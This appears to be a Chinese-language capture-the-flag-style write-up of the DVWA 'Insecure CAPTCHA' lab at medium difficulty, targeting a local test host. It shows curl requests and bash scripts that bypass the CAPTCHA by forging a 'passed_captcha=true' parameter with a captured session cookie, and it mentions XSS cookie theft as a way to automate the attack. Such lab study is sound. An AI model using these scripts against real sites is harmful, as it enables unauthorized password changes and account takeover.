# Insecure CAPTCHA

>Objective: Your aim, change the current user's password in an automated manner because of the poor CAPTCHA system.

之前在 low 難度時沒好好觀察前端的部分，現在來看一下 CAPTCHA 做了哪些事

### 觀察

可以看出 `k` 就是我們申請的 public key

```bash
6Lcl8EoeAAAAAM9dYVBygjc6ppgHcJSCvcfblNw2
```

```bash
{
	"POST": {
		"scheme": "https",
		"host": "www.google.com",
		"filename": "/recaptcha/api2/userverify",
		"query": {
			"k": "6Lcl8EoeAAAAAM9dYVBygjc6ppgHcJSCvcfblNw2"
		},
		"remote": {
			"Address": "172.217.160.68:443"
		}
	}
}
```

### 正常流程

如果 CAPTCHA 驗證成功就能取得 `g-recaptcha-response` 這個 value，和更新密碼的表單一起送出就能通過檢查

### change password

```bash
g-recaptcha-response
```

```bash
{
	"step": "1",
	"password_new": "1111",
	"password_conf": "1111",
	"g-recaptcha-response": "03AGdBq26Z9NdfV2KFtwApYtm2tmDJm2KocpDSKFDnm9pORA9njIIWg30efxvJVDQcTAt-bB4e9QVQvVC9IuEnKB4BLrsVckuNl0M01dnrzzFy7UzIR-397NOxuMcJ9XVDvsCh8yscyfaYfL5SCOaCNhUVxcey0TcmpWCOa9bMNWCx8gBoIKZCz_F2iB5v0Ocerw8gjSGRib28_ZRy8S-45INfrgC3DA7Aq7Bd80sprUX2w0Dasr8Pp-hta1jX9P1fW-__zHbcGSMdMSXEVpcJzkRKt5xtuUbGXIbfWuXgyjQQilbXkqnRRYbifbwmnNwcrN9kEF6zGbO8H7-6YIYlSRiLZ2PuHpcy2HeT0gukt5HDiAjVxyhkRbzf53TaEY3UdVII8p5vBsb5WOmQ7qT2RlI6OII3x93AiUaUo85XFKxQOB0CMIIkPtCb29zKDAkcbdOuXRqCU8y_",
	"Change": "Change"
}
```

```bash
{
	"step": "1",
	"password_new": "1234",
	"password_conf": "1234",
	"g-recaptcha-response": "03AGdBq27-Tc-GnLYIcFGrbU88L0VgaJAzMtPceF5WwhVMedmba8duTCieNn8JlUNFgOvEESma6LBEiXtxAvOSprxHg6U8Z_ySkE3kK0gNvsll9ZrPGpjk7GXugYzqM6Y0k5hHQOFxLEYLMMypA7pFl6w6oaTU0ti1jGs1B8KXzjQeeqqsTGBsohceKaV2epvgyx4ufgjtVSnSV07glfSneCNi1zRaGIPQTnTWrc-wMMOFQB3wHSpwNdehRRlJ3cShG8lHccfCpbhrvM2KVdVzihELeNAAae2ff6bzJusfQKlogbgMdTQdH23whEBq_487kQzRZllmNyZdBiSmXhFD6VmPzJVFRGiKKZ7N8RwI4yn9Q78GalTy5JE0PGnrtGeqN-zvl86EnNaiyCjDwOBZ2xFZwdb3aSlbhy_A6mYVz4hKabGuI6vNuIYuhTPZCB5NBqF9DEPNH915",
	"Change": "Change"
}
```

### 觀察 storage

恩...不太好解讀

### localstorage
```bash
_grecaptcha:"09APj96hT8iRUxC-jYRQLJPdetysMOZw4s4TUXZ4mdKdn6ESYQGgiLac6x-BtG-zhJpNzEsHr0mKGs-bosFqKAp4Pekg"
```
```bash
_GRECAPTCHA:"09APj96hTmVBUwXdk9UFJCoPyA5R2-md9Z8SyOTc-LQgx9M9hRZ0qthtydmztVGLyXHYgZ3DPeQo3EQI7WKv8-HBk"
```
以上觀察不出其他線索 XD

這些可以被視為純前端的部分，可以再次理解 Google 的 **CAPTCHA** 只能被視為過濾和限速用，當然有些類似 CAPTCHA 的套件也蠻常跟後端整合一起使用，但跟此題無關

一樣直接繞過的方式下手

### 直接檢查後端實作有沒有缺陷

走正常流程，通過檢查，出現 Change button，點下去

來觀察一下參數
```json
{
	"step": "2",
	"password_new": "1111",
	"password_conf": "1111",
	"passed_captcha": "true",
	"Change": "Change"
}
```

和 low 難度的相比多了一個  `"passed_captcha": "true"`

```json
step=2&password_new=222&password_conf=222&Change=Change
```

所以只要確認這兩個參數有改到就 ok

```json
step=2,
Change=Change
```

直接將此 request 複製成 curl ，填入其他密碼測試看看直接送有沒有效

關鍵就是要取得驗證 CAPTCHA 後的 cookie 內的 `PHPSESSIONID` ．再重送給後端就能修改密碼

```bash
curl -L -X POST "http://dvwa.localtest/vulnerabilities/captcha/#" \
-H 'Content-Type: application/x-www-form-urlencoded' \
-H 'Origin: http://dvwa.localtest' \
-H 'DNT: 1' \
-H 'Connection: keep-alive' \
-H 'Referer: http://dvwa.localtest/vulnerabilities/captcha/' \
-H 'Cookie: PHPSESSID=2d7pjcupfh347g4n5apfl1k4o6; security=medium' \
-H 'Upgrade-Insecure-Requests: 1' \
--data-raw 'step=2&password_new=3333&password_conf=3333&passed_captcha=true&Change=Change'
```

送出 curl 後可以看到 `Password Changed`
![](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/164cb7f9-27d0-4e64-a55a-6415751dbca1/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45EIPT3X45%2F20220216%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20220216T093929Z&X-Amz-Expires=86400&X-Amz-Signature=5906452ef30d0f76456d2d19929e4620e16c72c39c2069ba70aa80ce9722964f&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22&x-id=GetObject)

### Done

用新密碼 3333 重登成功
![](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/459b234d-9cfd-4dbc-a647-2bef59bfe945/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45EIPT3X45%2F20220216%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20220216T094002Z&X-Amz-Expires=86400&X-Amz-Signature=e74617cb368dc9103fb27e78c669f9ad2687990296dbd75ed4088a1101c89063&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22&x-id=GetObject)

如果能搭配 XSS 或其他手段取得 user cookie (因為要先登入過 DVWA) 那就有機會將攻擊自動化

`./test.sh`
```bash
#!/usr/bin/env bash
# usage: ./change-pwd.sh <new password> <session-id>

HOST=http://dvwa.localtest
NEW_PASSWORD=$1
SESSIONID=$2

curl -v -L \
-X POST "${HOST}/vulnerabilities/captcha/#" \
-H 'Content-Type: application/x-www-form-urlencoded' \
-H 'Origin: http://dvwa.localtest' \
-H 'Referer: http://dvwa.localtest/vulnerabilities/captcha/' \
-H "Cookie: PHPSESSID=${SESSIONID}; security=medium" \
--data-raw "step=2&password_new=${NEW_PASSWORD}&password_conf=${NEW_PASSWORD}&passed_captcha=true&Change=Change"
```

```bash
./test.sh 2222 3l7tambvpgcbe10cdc14rfbo84
```

---

更完整一點的腳本，要先執行 `login-test.sh` 取得 cookie，再執行  `update-pwd.sh` 更新密碼

```bash
./login-test.sh
```

```bash
#!/usr/bin/env bash
# usage: ./login-test.sh [<password>]

if [ -z "$1" ]
  then
    echo "No argument supplied, use default password instead"
    LOGIN_PASSWORD=password
fi

# DVWA host
HOST=http://dvwa.localtest
# create cookie and save csrf token
CSRF=`curl -s -L -c cookies.txt -b cookies.txt "${HOST}/login.php" | grep user_token  | grep -oE \[a-z0-9\]+ | awk 'length >= 10'`
# save session id
SESSIONID=$(grep PHPSESSID cookies.txt | cut -d $'\t' -f7)

# user & password for login to start tasks
USER=admin
LOGIN_PASSWORD=$1

# login at login page
RES=`curl -v -L -c cookies.txt -b cookies.txt \
-X POST "${HOST}/login.php" \
--data-raw \
"username=${USER}&password=${LOGIN_PASSWORD}&Login=Login&user_token=${CSRF}"`

if [[ $RES == *"Welcome to Damn Vulnerable Web Application!"* ]]; then
  printf "\n PASS!✅ \n"
else
  printf "\n LOGIN FAILED❌ \n"
fi
```
---
`update-pwd.sh` 可以使用 cookie file (預設) or 指定 session id 於 argv

```bash
./update-pwd.sh <password> 
```

```bash
./update-pwd.sh <password> <session-ed>
```


```bash
#!/usr/bin/env bash
# usage: ./update-pwd.sh <new password> [<session-id>]

HOST=http://dvwa.localtest
NEW_PASSWORD=$1
SESSIONID=$2

if [ -z "$2" ]
  then
    echo "No session id supplied, use cookie file instead."

    RES=`curl -v -L -c cookies.txt -b cookies.txt -X POST "${HOST}/vulnerabilities/captcha/#" \
    -H 'Content-Type: application/x-www-form-urlencoded' \
    -H "Origin: ${HOST}" \
    -H 'DNT: 1' \
    -H 'Connection: keep-alive' \
    -H "Referer: ${HOST}/vulnerabilities/captcha/" \
    -H 'Upgrade-Insecure-Requests: 1' \
    --data-raw "step=2&password_new=${NEW_PASSWORD}&password_conf=${NEW_PASSWORD}&passed_captcha=true&Change=Change"
    `
  else
    RES=`curl -v -L -X POST "${HOST}/vulnerabilities/captcha/#" \
    -H 'Content-Type: application/x-www-form-urlencoded' \
    -H "Origin: ${HOST}" \
    -H 'DNT: 1' \
    -H 'Connection: keep-alive' \
    -H "Referer: ${HOST}/vulnerabilities/captcha/" \
    -H 'Upgrade-Insecure-Requests: 1' \
    -H "Cookie: PHPSESSID=${SESSIONID}; security=medium" \
    --data-raw "step=2&password_new=${NEW_PASSWORD}&password_conf=${NEW_PASSWORD}&passed_captcha=true&Change=Change"
    `
fi

if [[ $RES == *"Password Changed."* ]]; then
  printf "\n PASSWORD CHANGED!✅ \n"
else
  printf "\n PASSWORD CHANGE FAILED❌ \n"
fi
```

要記得確認 cookie 中的的難度等級為 `medium`

```bash
# Netscape HTTP Cookie File
# https://curl.se/docs/http-cookies.html
# This file was generated by libcurl! Edit at your own risk.

dvwa.localtest	FALSE	/	FALSE	0	PHPSESSID	e176d3692ee6afa4798775328ad1b36c
#HttpOnly_dvwa.localtest	FALSE	/	FALSE	0	security	medium
```
